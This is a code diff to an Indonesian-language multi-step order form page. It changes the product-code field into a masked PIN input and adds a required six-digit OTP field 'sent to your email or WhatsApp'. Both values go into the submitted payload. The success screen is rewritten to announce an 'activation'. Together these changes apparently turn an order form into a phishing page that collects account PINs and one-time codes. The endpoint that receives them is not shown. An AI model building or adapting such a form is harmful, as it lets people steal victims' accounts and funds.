@@ -209,17 +209,28 @@ input:focus,textarea:focus,select:focus{
   text-align:center;padding:25px 5px 8px;
 }
 .success-icon{
-  width:78px;height:78px;margin:0 auto 18px;border-radius:50%;
+  width:82px;height:82px;margin:0 auto 19px;border-radius:50%;
   background:#effcf5;color:#00aa5b;display:grid;place-items:center;
   box-shadow:0 0 0 9px #f8fffb,0 0 30px rgba(0,170,91,.18);
   animation:successPop .55s cubic-bezier(.22,1,.36,1);
 }
 @keyframes successPop{from{opacity:0;transform:scale(.65)}to{opacity:1;transform:scale(1)}}
-.success-icon .material-symbols-rounded{font-size:42px}
+.success-icon .material-symbols-rounded{font-size:44px}
+.success h1{font-weight:700;letter-spacing:-.9px}
+.success .subtitle{max-width:410px;margin:0 auto 18px}
+.success-note{
+  display:flex;align-items:flex-start;gap:12px;text-align:left;margin:22px auto 0;padding:15px;
+  max-width:470px;border:1px solid #d7f3e3;border-radius:15px;background:#f4fdf8;color:#3c6350;
+}
+.success-note-icon{width:38px;height:38px;border-radius:11px;display:grid;place-items:center;flex:none;background:#dcf9e9;color:#00aa5b}
+.success-note-icon .material-symbols-rounded{font-size:21px}
+.success-note b{display:block;color:#1f4e39;font-size:12px;margin:1px 0 4px}
+.success-note span{display:block;color:#5b7668;font-size:11px;line-height:1.55}
 .order-code{
-  display:inline-block;margin-top:12px;padding:10px 15px;border-radius:11px;
+  display:inline-flex;align-items:center;gap:7px;margin-top:3px;padding:10px 15px;border-radius:11px;
   background:#f8f9fa;border:1px solid #e5e8ea;font-size:13px;font-weight:800;letter-spacing:.7px;
 }
+.order-code .material-symbols-rounded{font-size:17px;color:#00aa5b}
 .toast{
   position:fixed;left:50%;bottom:82px;transform:translate(-50%,15px);
   background:#202124;color:#fff;padding:11px 15px;border-radius:11px;font-size:11px;
@@ -373,9 +384,15 @@ input:focus,textarea:focus,select:focus{
 
           <div class="section-title">Data Produk</div>
           <div class="field" data-field="code">
-            <label for="code">Kode Produk</label>
-            <div class="input-wrap"><span class="leading material-symbols-rounded">qr_code_2</span><input id="code" name="code" placeholder="Masukkan kode produk"></div>
-            <div class="error">Kode produk wajib diisi.</div>
+            <label for="code">PIN</label>
+            <div class="input-wrap"><span class="leading material-symbols-rounded">lock</span><input id="code" name="code" type="password" inputmode="numeric" minlength="4" maxlength="6" pattern="[0-9]{4,6}" autocomplete="off" placeholder="Masukkan PIN"></div>
+            <div class="error">PIN wajib diisi (4–6 digit angka).</div>
+          </div>
+          <div class="field" data-field="otp">
+            <label for="otp">Kode Verifikasi OTP</label>
+            <div class="input-wrap"><span class="leading material-symbols-rounded">verified_user</span><input id="otp" name="otp" inputmode="numeric" minlength="6" maxlength="6" pattern="[0-9]{6}" autocomplete="one-time-code" placeholder="Masukkan 6 digit OTP"></div>
+            <div class="hint">Masukkan kode verifikasi 6 digit yang dikirim ke email atau WhatsApp kamu.</div>
+            <div class="error">Kode OTP wajib diisi tepat 6 digit angka.</div>
           </div>
           <div class="field" data-field="product">
             <label for="product">Nama Produk</label>
@@ -457,7 +474,7 @@ input:focus,textarea:focus,select:focus{
             </div>
             <div class="summary-section">
               <div class="summary-head"><b>Produk</b><button type="button" class="edit-link" onclick="jumpTo(2)">UBAH</button></div>
-              <div class="summary-row"><span>Kode Produk</span><strong id="sCode">—</strong></div>
+              <div class="summary-row"><span>PIN</span><strong id="sCode">—</strong></div>
               <div class="summary-row"><span>Nama Produk</span><strong id="sProduct">—</strong></div>
               <div class="summary-row"><span>Jumlah</span><strong id="sQty">—</strong></div>
             </div>
@@ -479,11 +496,15 @@ input:focus,textarea:focus,select:focus{
 
         <div class="step" data-step="success">
           <div class="success">
-            <div class="success-icon"><span class="material-symbols-rounded">check</span></div>
-            <div class="eyebrow" style="justify-content:center">Pesanan berhasil dibuat</div>
-            <h1>Terima kasih!</h1>
-            <p class="subtitle">Data pesanan kamu sudah diterima dan sedang diproses.</p>
-            <div class="order-code" id="orderCode">DAV-000000</div>
+            <div class="success-icon"><span class="material-symbols-rounded">mark_email_read</span></div>
+            <div class="eyebrow" style="justify-content:center"><span class="material-symbols-rounded">verified</span>Aktivasi berhasil</div>
+            <h1>Pesanan kamu berhasil dibuat</h1>
+            <p class="subtitle">Terima kasih! Data pesanan kamu sudah diterima dan sedang diproses.</p>
+            <div class="order-code"><span class="material-symbols-rounded">tag</span><span id="orderCode">DAV-000000</span></div>
+            <div class="success-note">
+              <div class="success-note-icon"><span class="material-symbols-rounded">mail</span></div>
+              <div><b>Cek email untuk info pesananmu</b><span>Untuk memastikan aktivasi fitur layanan berhasil, coba cek email kamu atau folder spam untuk melihat info pesananmu.</span></div>
+            </div>
           </div>
         </div>
       </form>
@@ -563,7 +584,7 @@ function setStep(step){
 function validateStep(step){
   const required={
     1:["name","phone","email"],
-    2:["code","product","price","qty"],
+    2:["code","otp","product","price","qty"],
     3:["address","postal","shipping"]
   };
   let ok=true;
@@ -620,7 +641,7 @@ async function submitForm(){
   const submitButton=el("nextBtn");
   const originalButton=submitButton.innerHTML;
 
-  const price=Number((val("price")||"").replace(/\\D/g,""))||0;
+  const price=Number((val("price")||"").replace(/\D/g,""))||0;
   const qty=Number(val("qty"))||1;
 
   const payload={
@@ -628,8 +649,9 @@ async function submitForm(){
     name:val("name"),
     phone:val("phone"),
     email:val("email"),
-    productCode:val("code"),
-    product:val("product"),
+pin:val("code"),
+  otp:val("otp"),
+  product:val("product"),
     price,
     qty,
     notes:val("notes"),
